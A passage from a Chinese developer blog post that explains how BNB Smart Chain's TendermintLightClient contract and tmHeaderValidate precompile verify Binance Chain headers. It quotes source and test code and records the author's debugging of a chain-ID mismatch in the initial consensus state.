这意味着该块的签名和状态根直到下一个块才包含在内。因此，每个块都包含一个名为 <code>LastCommit</code> 的字段，其中包含负责提交前一个块的投票，以及块头中的一个名为 <code>AppHash</code> 的字段，它指的是<code>应用程序处理前一个块的交易后的 Merkle 根哈希</code>。<br />
因此，如果我们想从<code>高度 H</code>验证<code>AppHash</code>，我们需要来自 <code>LastCommit</code> 在<code>高度 H+1</code>的签名。（请记住，此 <code>AppHash 仅包含直到并包括块 H-1 的所有交易的结果</code>）</p>
<p>与工作量证明不同，轻客户端协议不需要下载和检查区块链中的所有标头 - <strong>客户端始终可以直接跳转到可用的最新标头，只要验证器集没有太大变化</strong>。如果验证者集发生变化，客户端需要跟踪这些变化，这需要为每个发生重大变化的块下载标头。在这里，我们将假设验证器集是恒定的，并推迟处理验证器集更改。</p>
<p>以太坊平台支持 golang 实现的<code>无状态预编译合约</code>和<code>solidity实现的普通合约</code>。<br />
与普通合约相比，预编译合约效率更高，gas 成本更低，但它们是无状态的。但是，链上轻客户端必须是有状态的。所以这里我们将尝试一种混合方式：</p>
<ul class="lvl-1">
<li class="lvl-2">
<p>预编译实现合约（无状态计算，如签名验证）</p>
</li>
<li class="lvl-2">
<p>普通合约（存储验证器集和可信appHash）</p>
</li>
</ul>
</blockquote>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220922180103.png" alt="20220922180103" /></p>
<blockquote>
<p>基于solidity的智能合约,我们比较熟悉，所以接下来我们先了解一下预编译合约。</p>
</blockquote>
<h2 id="预编译合约">预编译合约:</h2>
<h3 id="介绍">介绍:</h3>
<p>预编译合约是 EVM 中用于提供更复杂库函数(通常用于加密、散列等复杂操作)的一种折衷方法，这些函数不适合编写操作码。<br />
它们适用于简单但经常调用的合约，或逻辑上固定但计算量很大的合约。<br />
预编译合约是在使用节点客户端(如geth)代码实现的，因为它们不需要 EVM，所以运行速度很快。 与使用直接在 EVM 中运行的函数相比，它对开发人员来说成本也更低。</p>
<p>简言之,预编译合约特点如下:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>常用于加密、散列、验证、数据计算等操作</p>
</li>
<li class="lvl-2">
<p>不运行在evm中，在geth客户端里实现</p>
</li>
<li class="lvl-2">
<p>无状态、运行速度快、成本低</p>
</li>
</ul>
<p>BSC 中的预编译合约定义如下：</p>
<figure class="highlight go"><figcaption><span>core/vm/contracts.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// PrecompiledContractsIstanbul contains the default set of pre-compiled Ethereum</span></span><br><span class="line"><span class="comment">// contracts used in the Istanbul release.</span></span><br><span class="line"><span class="keyword">var</span> PrecompiledContractsIstanbul = <span class="keyword">map</span>[common.Address]PrecompiledContract&#123;</span><br><span class="line">	common.BytesToAddress([]<span class="type">byte</span>&#123;<span class="number">1</span>&#125;): &amp;ecrecover&#123;&#125;,</span><br><span class="line">	common.BytesToAddress([]<span class="type">byte</span>&#123;<span class="number">2</span>&#125;): &amp;sha256hash&#123;&#125;,</span><br><span class="line">	common.BytesToAddress([]<span class="type">byte</span>&#123;<span class="number">3</span>&#125;): &amp;ripemd160hash&#123;&#125;,</span><br><span class="line">	common.BytesToAddress([]<span class="type">byte</span>&#123;<span class="number">4</span>&#125;): &amp;dataCopy&#123;&#125;,</span><br><span class="line">	common.BytesToAddress([]<span class="type">byte</span>&#123;<span class="number">5</span>&#125;): &amp;bigModExp&#123;&#125;,</span><br><span class="line">	common.BytesToAddress([]<span class="type">byte</span>&#123;<span class="number">6</span>&#125;): &amp;bn256AddIstanbul&#123;&#125;,</span><br><span class="line">	common.BytesToAddress([]<span class="type">byte</span>&#123;<span class="number">7</span>&#125;): &amp;bn256ScalarMulIstanbul&#123;&#125;,</span><br><span class="line">	common.BytesToAddress([]<span class="type">byte</span>&#123;<span class="number">8</span>&#125;): &amp;bn256PairingIstanbul&#123;&#125;,</span><br><span class="line">	common.BytesToAddress([]<span class="type">byte</span>&#123;<span class="number">9</span>&#125;): &amp;blake2F&#123;&#125;,</span><br><span class="line">  <span class="comment">// Bsc新增的</span></span><br><span class="line">	common.BytesToAddress([]<span class="type">byte</span>&#123;<span class="number">100</span>&#125;): &amp;tmHeaderValidate&#123;&#125;,</span><br><span class="line">	common.BytesToAddress([]<span class="type">byte</span>&#123;<span class="number">101</span>&#125;): &amp;iavlMerkleProofValidate&#123;&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>前面的都是在Etheruem中已经实现的预编译合约了，BSC 新增了两个:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>tmHeaderValidate</code>预编译合约: 主要用于验证 BC 块头是否合法，被 <code>TendermintLightClient</code> 系统合约调用</p>
</li>
<li class="lvl-2">
<p><code>iavlMerkleProofValidate</code>预编译合约: 主要用于验证 BC 跨链数据包是否合法，被 <code>CrossChainContract</code> 系统合约调用</p>
</li>
</ul>
<blockquote>
<p>接下来主要介绍预编译合约<code>tmHeaderValidate</code>和系统合约<code>TendermintLightClient</code></p>
</blockquote>
<h1>系统合约TendermintLightClient:</h1>
<h2 id="数据结构">数据结构:</h2>
<figure class="highlight js"><figcaption><span>TendermintLightClient.sol</span></figcaption><table><tr><td class="code"><pre><span class="line">contract <span class="title class_">TendermintLightClient</span> is <span class="title class_">ILightClient</span>, <span class="title class_">System</span>, <span class="title class_">IParamSubscriber</span> &#123;</span><br><span class="line"></span><br><span class="line">    struct <span class="title class_">ConsensusState</span> &#123;</span><br><span class="line">        uint64 preValidatorSetChangeHeight; <span class="comment">// 上一个验证者集合变更的高度</span></span><br><span class="line">        bytes32 appHash; <span class="comment">// BC的Merkle根哈希</span></span><br><span class="line">                         <span class="comment">// 对应bc的header.Block.Header.AppHash</span></span><br><span class="line">        bytes32 curValidatorSetHash; <span class="comment">// 对应bc的header.Block.Header.ValidatorsHash</span></span><br><span class="line">        bytes nextValidatorSet;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">uint64</span> =&gt;</span> <span class="title class_">ConsensusState</span>) public lightClientConsensusStates; <span class="comment">// 区块高度height=&gt;共识状态数据</span></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">uint64</span> =&gt;</span> address payable) public submitters; <span class="comment">// 区块高度height=&gt;提交者地址</span></span><br><span class="line">    uint64 public initialHeight; <span class="comment">// 初始化高度</span></span><br><span class="line">    uint64 public latestHeight;</span><br><span class="line">    bytes32 public chainID; <span class="comment">// 链标识符</span></span><br><span class="line">    <span class="comment">// 初始化共识状态</span></span><br><span class="line">    bytes constant public <span class="variable constant_">INIT_CONSENSUS_STATE_BYTES</span> = hex<span class="string">&quot;42696e616e63652d436861696e2d4e696c650000000000000000000000000000000000000000000229eca254b3859bffefaf85f4c95da9fbd26527766b784272789c30ec56b380b6eb96442aaab207bc59978ba3dd477690f5c5872334fc39e627723daa97e441e88ba4515150ec3182bc82593df36f8abb25a619187fcfab7e552b94e64ed2deed000000e8d4a51000&quot;</span>;</span><br><span class="line">    uint256 constant public <span class="variable constant_">INIT_REWARD_FOR_VALIDATOR_SER_CHANGE</span> = <span class="number">1e16</span>; <span class="comment">// 应该是0.01BNB</span></span><br><span class="line">    uint256 public rewardForValidatorSetChange;</span><br><span class="line"></span><br><span class="line">    event <span class="title function_">initConsensusState</span>(uint64 initHeight, bytes32 appHash);</span><br><span class="line">    event <span class="title function_">syncConsensusState</span>(uint64 height, uint64 preValidatorSetChangeHeight, bytes32 appHash, bool validatorChanged);</span><br><span class="line">    event <span class="title function_">paramChange</span>(string key, bytes value);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* solium-disable-next-line */</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) public &#123;&#125;</span><br><span class="line"></span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要关注的是 <code>INIT_CONSENSUS_STATE_BYTES</code> 初始化共识状态变量,该变量可在创始系统合约仓库<a href="https://github.com/bnb-chain/bsc-genesis-contract">bsc-genesis-contract</a>中的<code>generate-tendermintlightclient.js</code>中设置,这个值要设置得对,后面的区块头才能顺利通过验证并同步。</p>
<blockquote>
<p>在<code>INIT_CONSENSUS_STATE_BYTES</code>这变量上消耗了很多时间</p>
</blockquote>
<h2 id="初始化函数">初始化函数:</h2>
<figure class="highlight js"><figcaption><span>TendermintLightClient.sol</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>) external onlyNotInit &#123;</span><br><span class="line">    uint256 pointer;</span><br><span class="line">    uint256 length;</span><br><span class="line">    (pointer, length) = <span class="title class_">Memory</span>.<span class="title function_">fromBytes</span>(<span class="variable constant_">INIT_CONSENSUS_STATE_BYTES</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* solium-disable-next-line */</span></span><br><span class="line">    <span class="comment">// sstore: writes a (u)int256 to storage</span></span><br><span class="line">    <span class="comment">// mload：reads a (u)int256 from memory</span></span><br><span class="line">    <span class="comment">// 从pointer位置内存中读取数据，再写入到合约的storage存储中</span></span><br><span class="line">    assembly &#123;</span><br><span class="line">        <span class="title function_">sstore</span>(chainID_slot, <span class="title function_">mload</span>(pointer))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">ConsensusState</span> memory cs;</span><br><span class="line">    uint64 height;</span><br><span class="line">    (cs, height) = <span class="title function_">decodeConsensusState</span>(pointer, length, <span class="literal">false</span>);</span><br><span class="line">    cs.<span class="property">preValidatorSetChangeHeight</span> = <span class="number">0</span>;</span><br><span class="line">    lightClientConsensusStates[height] = cs;</span><br><span class="line"></span><br><span class="line">    initialHeight = height;</span><br><span class="line">    latestHeight = height;</span><br><span class="line">    alreadyInit = <span class="literal">true</span>;</span><br><span class="line">    rewardForValidatorSetChange = <span class="variable constant_">INIT_REWARD_FOR_VALIDATOR_SER_CHANGE</span>;</span><br><span class="line"></span><br><span class="line">    emit <span class="title function_">initConsensusState</span>(initialHeight, cs.<span class="property">appHash</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>初始化函数中主要是将初始化共识状态变量<code>INIT_CONSENSUS_STATE_BYTES</code>中的值通过内联汇编的方式写入<code>storage</code>中，该函数以及后面的函数会大量操作指针变量<code>uint256 pointer</code>和长度变量<code>uint256 length</code>来实现存储/读取数据的操作。</p>
<h2 id="同步区块头函数">同步区块头函数:</h2>
<figure class="highlight js"><figcaption><span>TendermintLightClient.sol</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// 同步区块头</span></span><br><span class="line"><span class="comment">// bsc-relayer会调用该方法</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">syncTendermintHeader</span>(<span class="params">bytes calldata header, uint64 height</span>) external onlyRelayer returns (bool) &#123;</span><br><span class="line">    <span class="built_in">require</span>(submitters[height] == <span class="title function_">address</span>(<span class="number">0x0</span>), <span class="string">&quot;can&#x27;t sync duplicated header&quot;</span>); <span class="comment">// 不能同步重复的区块头</span></span><br><span class="line">    <span class="built_in">require</span>(height &gt; initialHeight, <span class="string">&quot;can&#x27;t sync header before initialHeight&quot;</span>); <span class="comment">// 不能同步初始高度之前的区块头,当前同步的区块高度必须大于初始高度</span></span><br><span class="line"></span><br><span class="line">    uint64 preValidatorSetChangeHeight = latestHeight; <span class="comment">// 上一个验证人集合变更的高度 = 当前最新高度</span></span><br><span class="line">    <span class="title class_">ConsensusState</span> memory cs = lightClientConsensusStates[preValidatorSetChangeHeight];</span><br><span class="line">    <span class="keyword">for</span> (; preValidatorSetChangeHeight &gt;= height &amp;&amp; preValidatorSetChangeHeight &gt;= initialHeight;) &#123;</span><br><span class="line">        preValidatorSetChangeHeight = cs.<span class="property">preValidatorSetChangeHeight</span>;</span><br><span class="line">        cs = lightClientConsensusStates[preValidatorSetChangeHeight]; <span class="comment">// cs存储的是上一次的共识状态数据</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cs.<span class="property">nextValidatorSet</span>.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        preValidatorSetChangeHeight = cs.<span class="property">preValidatorSetChangeHeight</span>;</span><br><span class="line">        cs.<span class="property">nextValidatorSet</span> = lightClientConsensusStates[preValidatorSetChangeHeight].<span class="property">nextValidatorSet</span>;</span><br><span class="line">        <span class="built_in">require</span>(cs.<span class="property">nextValidatorSet</span>.<span class="property">length</span> != <span class="number">0</span>, <span class="string">&quot;failed to load validator set data&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//32 + 32 + 8 + 32 + 32 + cs.nextValidatorSet.length;</span></span><br><span class="line">    uint256 length = <span class="number">136</span> + cs.<span class="property">nextValidatorSet</span>.<span class="property">length</span>;</span><br><span class="line">    bytes memory input = <span class="keyword">new</span> <span class="title function_">bytes</span>(length + header.<span class="property">length</span>);</span><br><span class="line">    uint256 ptr = <span class="title class_">Memory</span>.<span class="title function_">dataPtr</span>(input); <span class="comment">// Returns a memory pointer to the data portion of the provided bytes array.</span></span><br><span class="line">    <span class="built_in">require</span>(<span class="title function_">encodeConsensusState</span>(cs, preValidatorSetChangeHeight, ptr, length), <span class="string">&quot;failed to serialize consensus state&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write header to input</span></span><br><span class="line">    uint256 src;</span><br><span class="line">    ptr = ptr + length;</span><br><span class="line">    (src, length) = <span class="title class_">Memory</span>.<span class="title function_">fromBytes</span>(header);</span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">copy</span>(src, ptr, length); <span class="comment">//  Copy &#x27;len&#x27; bytes from memory address &#x27;src&#x27;, to address &#x27;dest&#x27;.</span></span><br><span class="line"></span><br><span class="line">    length = input.<span class="property">length</span> + <span class="number">32</span>;</span><br><span class="line">    <span class="comment">// Maximum validator quantity is 99</span></span><br><span class="line">    bytes32[<span class="number">128</span>] memory result;</span><br><span class="line">    <span class="comment">/* solium-disable-next-line */</span></span><br><span class="line">    assembly &#123;</span><br><span class="line">    <span class="comment">// call validateTendermintHeader precompile contract</span></span><br><span class="line">    <span class="comment">// 调用预编译合约中的方法</span></span><br><span class="line">    <span class="comment">// Contract address: 0x64</span></span><br><span class="line">        <span class="comment">// if iszero(call(gasLimit, contractAddress, value, input, inputLength, output, outputLength)) &#123;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">iszero</span>(<span class="params">staticcall(not(<span class="number">0</span>), <span class="number">0x64</span>, input, length, result, <span class="number">4096</span>)</span>) &#123;</span><br><span class="line">            <span class="title function_">revert</span>(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Judge if the validator set is changed</span></span><br><span class="line">    <span class="comment">/* solium-disable-next-line */</span></span><br><span class="line">    assembly &#123;</span><br><span class="line">        length := <span class="title function_">mload</span>(<span class="title function_">add</span>(result, <span class="number">0</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 验证者集合是否发生变化的标志</span></span><br><span class="line">    bool validatorChanged = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ((length &amp; (<span class="number">0x01</span> &lt;&lt; <span class="number">248</span>)) != <span class="number">0x00</span>) &#123;</span><br><span class="line">        validatorChanged = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 系统奖励合约的提取奖励函数</span></span><br><span class="line">        <span class="title class_">ISystemReward</span>(<span class="variable constant_">SYSTEM_REWARD_ADDR</span>).<span class="title function_">claimRewards</span>(msg.<span class="property">sender</span>, rewardForValidatorSetChange);</span><br><span class="line">    &#125;</span><br><span class="line">    length = length &amp; <span class="number">0xffffffffffffffff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* solium-disable-next-line */</span></span><br><span class="line">    assembly &#123;</span><br><span class="line">        ptr := <span class="title function_">add</span>(result, <span class="number">32</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint64 actualHeaderHeight;</span><br><span class="line">    <span class="comment">// 解码共识状态</span></span><br><span class="line">    <span class="comment">// ptr 指针位置、length长度、validatorChanged是否验证者集合发生变化</span></span><br><span class="line">    (cs, actualHeaderHeight) = <span class="title function_">decodeConsensusState</span>(ptr, length, !validatorChanged);</span><br><span class="line">    <span class="built_in">require</span>(actualHeaderHeight == height, <span class="string">&quot;header height doesn&#x27;t equal to the specified height&quot;</span>); <span class="comment">// 区块头高度必须等于指定的高度</span></span><br><span class="line"></span><br><span class="line">    submitters[height] = msg.<span class="property">sender</span>;</span><br><span class="line">    cs.<span class="property">preValidatorSetChangeHeight</span> = preValidatorSetChangeHeight;</span><br><span class="line">    lightClientConsensusStates[height] = cs;</span><br><span class="line">    <span class="keyword">if</span> (height &gt; latestHeight) &#123;</span><br><span class="line">        latestHeight = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    emit <span class="title function_">syncConsensusState</span>(height, preValidatorSetChangeHeight, cs.<span class="property">appHash</span>, validatorChanged);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数需要关注的是 调用了预编译合约<code>tmHeaderValidate</code>进行区块头合法性的验证</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">    <span class="comment">// call validateTendermintHeader precompile contract</span></span><br><span class="line">    <span class="comment">// 调用预编译合约中的方法</span></span><br><span class="line">    <span class="comment">// Contract address: 0x64</span></span><br><span class="line">        <span class="comment">// if iszero(call(gasLimit, contractAddress, value, input, inputLength, output, outputLength)) &#123;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">iszero</span>(<span class="params">staticcall(not(<span class="number">0</span>), <span class="number">0x64</span>, input, length, result, <span class="number">4096</span>)</span>) &#123;</span><br><span class="line">            <span class="title function_">revert</span>(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>调用关系如下:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220923112409.png" alt="20220923112409" /></p>
<blockquote>
<p>一开始就卡在调用预编译合约这一步,验证一直没法通过。</p>
</blockquote>
<h1>预编译合约tmHeaderValidate:</h1>
<p>先在geth中找到预编译合约的代码文件: <code>core/vm/contracts_lightclient.go</code> ,通过测试文件<code>core/vm/contracts_lightclient_test.go</code>可以帮助我们测试、快速了解。</p>
<h2 id="测试代码">测试代码:</h2>
<figure class="highlight go"><figcaption><span>core/vm/contracts_lightclient_test.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestTmHeaderValidateAndMerkleProofValidate</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">  <span class="comment">// 初始共识状态</span></span><br><span class="line">  consensusStateBytes, err := hex.DecodeString(<span class="string">&quot;...&quot;</span>)</span><br><span class="line">  require.NoError(t, err)</span><br><span class="line">  <span class="comment">// 解码</span></span><br><span class="line">  cs, err := lightclient.DecodeConsensusState(consensusStateBytes)</span><br><span class="line">  require.NoError(t, err)</span><br><span class="line">  <span class="comment">// 新区块头的数据</span></span><br><span class="line">  headerBytes, err := hex.DecodeString(<span class="string">&quot;....&quot;</span>)</span><br><span class="line">  require.NoError(t, err)</span><br><span class="line"></span><br><span class="line">  parameterInput := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">32</span>+<span class="built_in">len</span>(consensusStateBytes)+<span class="built_in">len</span>(headerBytes))</span><br><span class="line">  binary.BigEndian.PutUint64(parameterInput[<span class="number">24</span>:<span class="number">32</span>], <span class="type">uint64</span>(<span class="built_in">len</span>(consensusStateBytes)))</span><br><span class="line">  <span class="built_in">copy</span>(parameterInput[<span class="number">32</span>:<span class="number">32</span>+<span class="built_in">len</span>(consensusStateBytes)], consensusStateBytes)</span><br><span class="line">  <span class="built_in">copy</span>(parameterInput[<span class="number">32</span>+<span class="built_in">len</span>(consensusStateBytes):], headerBytes)</span><br><span class="line"></span><br><span class="line">  totalLengthPrefix := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">32</span>)</span><br><span class="line">  binary.BigEndian.PutUint64(totalLengthPrefix[<span class="number">0</span>:<span class="number">8</span>], <span class="number">0</span>)</span><br><span class="line">  binary.BigEndian.PutUint64(totalLengthPrefix[<span class="number">8</span>:<span class="number">16</span>], <span class="number">0</span>)</span><br><span class="line">  binary.BigEndian.PutUint64(totalLengthPrefix[<span class="number">16</span>:<span class="number">24</span>], <span class="number">0</span>)</span><br><span class="line">  binary.BigEndian.PutUint64(totalLengthPrefix[<span class="number">24</span>:], <span class="type">uint64</span>(<span class="built_in">len</span>(parameterInput)))</span><br><span class="line">  input := <span class="built_in">append</span>(totalLengthPrefix, parameterInput...)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> tmHeaderValidateContract tmHeaderValidate</span><br><span class="line">  <span class="comment">// 区块头验证</span></span><br><span class="line">  <span class="comment">// 区块头里的共识状态</span></span><br><span class="line">  syncedConsensusStateBytes, err := tmHeaderValidateContract.Run(input) <span class="comment">// 验证</span></span><br><span class="line">  require.NoError(t, err)</span><br><span class="line">  syncedConsensusState, err := lightclient.DecodeConsensusState(syncedConsensusStateBytes[<span class="number">32</span>:])</span><br><span class="line">  require.NoError(t, err)</span><br><span class="line">  <span class="comment">// 连续区块的情况</span></span><br><span class="line">  require.Equal(t, testHeight+<span class="number">1</span>, syncedConsensusState.Height)</span><br><span class="line">  require.Equal(t, cs.ChainID, syncedConsensusState.ChainID) <span class="comment">// chainId相等</span></span><br><span class="line">  ....</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>共识状态数据结构:</p>
<figure class="highlight go"><figcaption><span>core/vm/lightclient/types.go</span></figcaption><table><tr><td class="code"><pre><span class="line">consensusState := ConsensusState&#123;</span><br><span class="line">  ChainID:             chainID,</span><br><span class="line">  Height:              height,</span><br><span class="line">  AppHash:             appHash,</span><br><span class="line">  CurValidatorSetHash: curValidatorSetHash,</span><br><span class="line">  NextValidatorSet: &amp;tmtypes.ValidatorSet&#123;</span><br><span class="line">    Validators: validatorSet,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先看测试代码前面的部分,主要步骤如下:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>十六进制的初始化的共识状态字节数组字符串，解码成共识状态数据结构体<code>cs</code></p>
</li>
<li class="lvl-2">
<p>十六进制的要同步的区块头数据，解码成共识状态数据结构体<code>newCs</code></p>
</li>
<li class="lvl-2">
<p>两个数据结构进行比较、验证</p>
</li>
</ul>
<p>轻客户端本身保存着当前的活跃验证者集合，当收到新的区块后，</p>
<ol>
<li class="lvl-3">
<p>首先对新区块头做基本的检查: 例如<code>chainId</code>是否相等</p>
</li>
<li class="lvl-3">
<p>判断新区块头是否获得了3分之2的投票<br />
区块头中的验证者集合与轻客户端本身存储的验证者集合做比较，若相同，则通过+2/3的投票，通过验证，若不同，更新轻客户端的活跃验证者集合，再次验证；</p>
</li>
<li class="lvl-3">
<p>当轻客户端的安全性不足时（如高度不连续、bft超过1/3等等），与全节点进行交互验证。</p>
</li>
</ol>
<blockquote>
<p>上面部分摘自《区块链架构与实现-cosmos详解-9.1.1轻客户端原理概述》</p>
</blockquote>
<h3 id="共识状态数据结构">共识状态数据结构:</h3>
<p>先把解码后的数据打印出来观察一下。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">=== RUN   TestTmHeaderValidateAndMerkleProofValidateMy</span><br><span class="line">[*****] tmHeaderValidate Run Func </span><br><span class="line">[*****] Step 1</span><br><span class="line">[*****] Step 2</span><br><span class="line">[*****] cs: &amp;&#123;715 2 [41 236 162 84 179 133 155 255 239 175 133 244 201 93 169 251 210 101 39 118 107 120 66 114 120 156 48 236 86 179 128 182] [235 150 68 42 170 178 7 188 89 151 139 163 221 71 118 144 245 197 135 35 52 252 57 230 39 114 61 170 151 228 65 232] ValidatorSet&#123;</span><br><span class="line">  Proposer: Validator&#123;35B42F545A2E3575E48A95B47C9E9540074756BD PubKeyEd25519&#123;8BA4515150EC3182BC82593DF36F8ABB25A619187FCFAB7E552B94E64ED2DEED&#125; VP:1000000000000 A:0&#125;</span><br><span class="line">  Validators:</span><br><span class="line">    Validator&#123;35B42F545A2E3575E48A95B47C9E9540074756BD PubKeyEd25519&#123;8BA4515150EC3182BC82593DF36F8ABB25A619187FCFAB7E552B94E64ED2DEED&#125; VP:1000000000000 A:0&#125;</span><br><span class="line">&#125;&#125;</span><br><span class="line">[*****] header: SignedHeader&#123;</span><br><span class="line">  Header&#123;</span><br><span class="line">    Version:        &#123;10 0&#125;</span><br><span class="line">    ChainID:        715</span><br><span class="line">    Height:         5335</span><br><span class="line">    Time:           2022-09-20 10:00:41.504366656 +0000 UTC</span><br><span class="line">    NumTxs:         0</span><br><span class="line">    TotalTxs:       0</span><br><span class="line">    LastBlockID:    0EE58A3014F929D14E9A82AB04CDBF2097B1915A0CF8C23EB8143B900777357F:1:A84AF4EA95C5</span><br><span class="line">    LastCommit:     B6D621C0189F2DFD4767E85C57B61813804DECF7A32F08E73666F53616E5FDDF</span><br><span class="line">    Data:           </span><br><span class="line">    Validators:     C506C171480200F8EDE028065D07D02CA8DA35C94463326A6E31FBD6CF82388C</span><br><span class="line">    NextValidators: C506C171480200F8EDE028065D07D02CA8DA35C94463326A6E31FBD6CF82388C</span><br><span class="line">    App:            0E067C5259944D79F6110455B387C9EF941C9D10A8552B5ACDD3DEF69868DE25</span><br><span class="line">    Consensus:       294D8FBD0B94B767A7EBA9840F299A3586DA7FE6B5DEAD3B7EECBA193C400F93</span><br><span class="line">    Results:        </span><br><span class="line">    Evidence:       </span><br><span class="line">    Proposer:       931B028E3A2B6C045D0E4579470E9E50847029A2</span><br><span class="line">  &#125;<span class="comment">#20404785119D52196F6BA954C57AF0F0FF19E680921A7F7E8A4A8CD485195972</span></span><br><span class="line">  Commit&#123;</span><br><span class="line">    BlockID:    20404785119D52196F6BA954C57AF0F0FF19E680921A7F7E8A4A8CD485195972:1:6B3354315C9D</span><br><span class="line">    Precommits:</span><br><span class="line">      Vote&#123;0:931B028E3A2B 5335/00/2(Precommit) 20404785119D 654C58D09A92 @ 2022-09-20T10:00:42.512185556Z&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="基本检查">基本检查:</h3>
<p>先对新区块头的数据进行基本检查,例如<code>chainId</code>是否相等。<br />
一开始就是卡在这一步,<code>generate-tendermintlightclient.js</code>中默认的<code>INIT_CONSENSUS_STATE_BYTES</code>里的<code>chainId</code>为<code>Binance-Chain-Nile</code>，而我同步过来新区块头里的<code>chainId</code>为715</p>
<figure class="highlight go"><figcaption><span>core/vm/contracts_lightclient_encode_test.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestTmHeaderValidateAndMerkleProofValidateTemp</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">	<span class="comment">// 初始共识状态</span></span><br><span class="line">	<span class="comment">// TendermintLightClient.sol默认的INIT_CONSENSUS_STATE_BYTES里的chainId为Binance-Chain-Nile</span></span><br><span class="line">	consensusStateBytesStr := <span class="string">&quot;3731350000000000000000000000000000000000000000000000000000000000000000000000000229eca254b3859bffefaf85f4c95da9fbd26527766b784272789c30ec56b380b6eb96442aaab207bc59978ba3dd477690f5c5872334fc39e627723daa97e441e88ba4515150ec3182bc82593df36f8abb25a619187fcfab7e552b94e64ed2deed000000e8d4a51000&quot;</span> <span class="comment">// 十六进制字符串</span></span><br><span class="line">	consensusStateBytes, err := hex.DecodeString(consensusStateBytesStr)</span><br><span class="line">	require.NoError(t, err)</span><br><span class="line"></span><br><span class="line">	cs, err := lightclient.DecodeConsensusState(consensusStateBytes)</span><br><span class="line">	require.NoError(t, err)</span><br><span class="line"></span><br><span class="line">	fmt.Printf(<span class="string">&quot;cs: %v \n&quot;</span>, cs)</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span>生成chainId可自定义的INIT_CONSENSUS_STATE_BYTES</span></span><br><span class="line">	cs.ChainID = <span class="string">&quot;715&quot;</span>	<span class="comment">// 修改链id</span></span><br><span class="line">	cs.Height = <span class="number">2</span> <span class="comment">// 修改初始高度</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span>修改验证者集合ValidatorSet和Validators</span></span><br><span class="line">	consensusStateBytes, err = cs.EncodeConsensusState()</span><br><span class="line">	<span class="comment">// 需要转成十六进制字符串</span></span><br><span class="line">	newConsensusStateBytesStr := hex.EncodeToString(consensusStateBytes)</span><br><span class="line">	fmt.Println(<span class="string">&quot;consensusStateBytesHexStr: &quot;</span>, newConsensusStateBytesStr)</span><br><span class="line">	newConsensusStateBytes, err := hex.DecodeString(newConsensusStateBytesStr)</span><br><span class="line">	newcs, err := lightclient.DecodeConsensusState(newConsensusStateBytes)</span><br><span class="line">	require.NoError(t, err)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;newcs: %v \n&quot;</span>, newcs)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我尝试去修改其中的链id,再编码回去，<code>chainId</code>校验可以通过,但会出现新的报错:投票权重不足</p>
